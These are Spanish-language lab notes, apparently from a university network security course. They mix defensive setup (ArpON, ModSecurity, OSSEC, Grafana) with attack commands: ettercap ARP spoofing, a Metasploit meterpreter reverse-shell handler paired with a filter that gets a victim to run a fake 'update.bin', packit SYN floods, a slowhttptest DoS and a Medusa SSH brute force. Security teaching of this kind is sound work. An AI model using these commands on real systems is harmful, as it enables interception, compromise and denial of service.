
# d) Segmento 2002 (script)

- python3 ipv4_to_ipv6.py

- nmap -6 -iL direcciones_ipv6.txt

- nmap -6 -iL direcciones_ipv6.txt -p 80,443 -sV → Puertos 80 y 443

- atk6-alive6 ens33 → muestra direcciones vivas en el segmento.

- ping -6 -I ens33 ff02::1 → Aquí lo que le decimos es que haga un ping -6 a ens33 a la dirección ff02::1 que lo que hace es redireccionar un mensaje a toda la red por multicast, en resumen redirecciona un ping, es una dirección link-local multicast

# f) URLs visitadas por la víctima

**APAGAR ARPON:**
- systemctl stop arpon@ens33
- reboot

**PROBAR ESTO:**
- añadir en el ettercap: -P unified_sniffing

**PROCEDIMIENTO NORMAL:**
- Cambiar en /etc/ettercap/etter.conf los valores de ec_gid y ec_uid a 0

- remote_browser = "lynx http://%host%url" → Opcional. Si solo quieres que se centre en un navegador en específico

- ettercap -Tq -i ens33 -w ficherito.pcap -P remote_browser -M arp:remote /10.11.48.196// /10.11.48.1//

# g) Metasploit + Ettercap

TODO: Hacer zip con permisos de ejecución en el payload y un README. Cambiar el filtro:
- etterfilter html.filter –o filter.ef

## Atacante:
### 1º terminal
- msfconsole
- use exploit/multi/handler
- set payload linux/x64/meterpreter_reverse_tcp
- set lhost 10.11.49.52
- set lport 1234

### 2º terminal
- ettercap -i ens33 -Tq -F filtroSecurity.ef -M arp:remote /10.11.48.195// /10.11.48.1//

## Víctima
- lynx http://10.1.49.52
- unzip update.zip
- ./update.bin

# i) Arpon

- Añadir en **/etc/arpon.conf** las relaciones IP-MAC a securizar
    10.11.48.1 dc:08:56:10:84:b9

Encender:
- systemctl start arpon@ens33

Apagar:
- systemctl stop arpon@ens33
- reboot

Si te hacen ettercap la MAC de las securizadas no deberían cambiar (arp –a)

```
i) arp -n --> ves la tabla arp. Ahí buscas la ip del router (10.11.48.1) y miras la MAC que tiene asociada ( dc:08:56:10:84:b9 )

systemctl start arpon@ens33
systemctl stop arpon@ens33

ps -A | grep arpon --> vemos si está corriendo arpon y su PID
```

# j) nmap

-- nmap -sP 10.11.48.0/23 --> con -sP les hace ping para saber si están despiertos. Con esto miramos el estado de todas las máquinas del rango especificado (nuestra red)

-- nmap -p 23 10.11.48.195 --> mira si el puerto 23 está up en la máquina con ip 10.11.48.195

-- nmap -P 10.11.48.195 --> te muestra los puertos abiertos, pero esto también lo hace sin ninguna opción ( nmap 10.11.48.195 )

-- nmap -sV 10.11.48.195 --> muestra info acerca del servicio y su versión. En el caso del puerto 22, muestra no solo ssh (como siempre) sino que te muestra la versión: OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)

Entiendo que si tienes apache también debería aparecer

-- nmap -O 10.11.48.195 --> muestra una SUPOSICIÓN acerca del SO que tiene esa máquina.

-- nmap -O --osscan-guess 10.11.49.46 --> osscan-guess va a intentar adivinar el SO, aun cuando no coincide con ninguna huella registrada. Esta opción va a tardar más y se puede equivocar con más frecuencia, pero es útil para identificar SOs poco comunes.


# l) Prometheus, node_exporter y Grafana

**PUERTOS:**
```
Grafana ->       3000
Prometheus ->    9090
node_exporter -> 9100
```

## Grafana

Dashboard → Importar → ID: 1860 → Y ale, a vivir

# m) TEORÍA

packit –c 0 –b 0 –s –d –F S –S xx –D xx:

- -c: número de paquetes (0=inyectar indefinidamente)
-  -b: cada cuanto tiempo (0=indefinidamente) 
-  -s: ip origen. Usar –sR para utilizar una aleatoria 
-  -d: ip destino. Usar –dR para utilizar una aleatoria 
-  -F: TCP flags (SFAPUR, S=SYN) 
-  -S: puerto origen, por defecto es random 
         21,80,443: el firewall los deja salir, el origen responde (+ mensajes) 
-  -D: puerto destino, por defecto es 0 - 22,80,123,514: lo deja pasar el firewall

**ATAQUE DIRECTO:** 
```
packit –c 0 –b 0 –s R–d –F S –S 80 –D 22 
```
    
**ATAQUE REFLECTIVO:** 
```
packit –c 0 –b 0 –s –d R –F S –S 80 –D 22
```


# n) DOS

**Comando del atacante (slowhttptest)**
```
slowhttptest -c 1000 -g -X -o slow_red_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.48.197 -p 3
```
> El -p 3 no es necesario → -p: timeout a esperar por la repsuesta HTTP en probe connection, tras el cual se considera el servidor como inaccesible


# o) Modsecurity

- Variable SecRuleEngine On → la cambiamos de DetectionOnly a On, ahora de detectarme va a pasar a defenderse también

- SecConnEngine On -> Configura el motor de conexiones. Esta directiva afecta a las directivas: SecConnReadStateLimit y SecConnWriteStateLimit

- SecConnReadStateLimit 30 -> Establece un límite por dirección IP de cuántas conexiones pueden estar en estado SERVER_BUSY_READ

- SecConnWriteStateLimit 30 -> Establece un límite por dirección IP de cuántas conexiones pueden estar en estado SERVER_BUSY_WRITE

**ENCENDER:**
```
a2enmod security2
```

**APAGAR:**
```
a2dismod security2
```

# p) Transferencia de zona

Las Transferencias de zona dns, a veces llamadas AXFR por el tipo de solicitud, es un tipo de transacción de DNS. Es uno de varios mecanismos disponibles para administradores para replicar bases de datos DNS a través de un conjunto de servidores DNS. La transferencia puede hacerse de dos formas: completa (AXFR) o incremental (IXFR) 

Una transferencia de zona utiliza el protocolo TCP para el transporte, y toma la forma de una transacción de cliente-servidor. El cliente que solicita una transferencia de zona puede ser un servidor esclavo o servidor secundario, que solicita datos de un servidor maestro, a veces llamado un servidor primario. La parte de la base de datos que se replica es una zona

Esto va a decir que no:
```
nslookup -q=AXFR udc.es

dig axfr udc.es

host -t AXFR sol.udc.es # Intenta realizar la transferencia de zona
```

## Resolución inversa
```
dnsrecon -d udc.es -r 193.144.48.1-193.144.63.254 # Resolución de DNS inversa de cada un de las ip del rango para obtener los nombres de dominio
```

# s) Ossec

- nano /var/ossec/etc/ossec.conf

- Meter:
```html
<global>
   <!-- Otras configuraciones -->
   <white_list>127.0.0.1</white_list>
   <disable_external_rules>no</disable_external_rules>
   <frequency>120</frequency>
   <maxagentsperminute>10</maxagentsperminute>
   <maxretry>5</maxretry>
   <time-reconnect>120</time-reconnect>
</global>
```

- Luego:
```
sudo service ossec restart
```

**INICIALIZAR/PARAR:** 
```
sudo /var/ossec/bin/ossec-control start 
sudo /var/ossec/bin/ossec-control stop 
```

**Para ver si lo dropee o no:** 
```
iptables -L
```


DESBANEAR MANUALMENTE
```
/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.48.197 /var/ossec/active-response/bin/host-deny.sh delete - 10.11.48.197 /var/ossec/bin/ossec-control restart
```

## Medusa
```
medusa -h 10.11.49.46 -u lsi -P pass.txt -M ssh -f
```

